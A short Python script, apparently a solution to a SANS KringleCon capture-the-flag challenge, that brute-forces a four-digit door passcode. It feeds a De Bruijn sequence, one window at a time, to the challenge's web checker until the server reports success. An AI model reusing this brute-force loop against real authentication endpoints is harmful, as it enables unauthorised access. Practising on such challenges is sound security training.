#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# SANS KringleCon
# De Brujn sequence code bruteforcer

import requests

baseUrl = "https://doorpasscoden.kringlecastle.com/checkpass.php?i="
appendUrl = "&resourceId=undefined"

sequenceString = "0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 0 1 2 0 0 1 3 0 0 2 1 0 0 2 2 0 0 2 3 0 0 3 1 0 0 3 2 0 0 3 3 0 1 0 1 0 2 0 1 0 3 0 1 1 1 0 1 1 2 0 1 1 3 0 1 2 1 0 1 2 2 0 1 2 3 0 1 3 1 0 1 3 2 0 1 3 3 0 2 0 2 0 3 0 2 1 1 0 2 1 2 0 2 1 3 0 2 2 1 0 2 2 2 0 2 2 3 0 2 3 1 0 2 3 2 0 2 3 3 0 3 0 3 1 1 0 3 1 2 0 3 1 3 0 3 2 1 0 3 2 2 0 3 2 3 0 3 3 1 0 3 3 2 0 3 3 3 1 1 1 1 2 1 1 1 3 1 1 2 2 1 1 2 3 1 1 3 2 1 1 3 3 1 2 1 2 1 3 1 2 2 2 1 2 2 3 1 2 3 2 1 2 3 3 1 3 1 3 2 2 1 3 2 3 1 3 3 2 1 3 3 3 2 2 2 2 3 2 2 3 3 2 3 2 3 3 3 3 (0 0 0) "


sequence = sequenceString.split(' ')

while sequence:
  # Get the first four digits of the code
  currentCode = ''.join(sequence[:4])

  targetUrl = baseUrl + currentCode + appendUrl
  print ('Trying: ' + targetUrl)

  r = requests.get(targetUrl)
  if (r.json()['success'] != False):
    print ('Code found: ' + currentCode)
    print (r.json())
    exit()
  # Remove the first digit of the code, then retry
  sequence.pop(0)
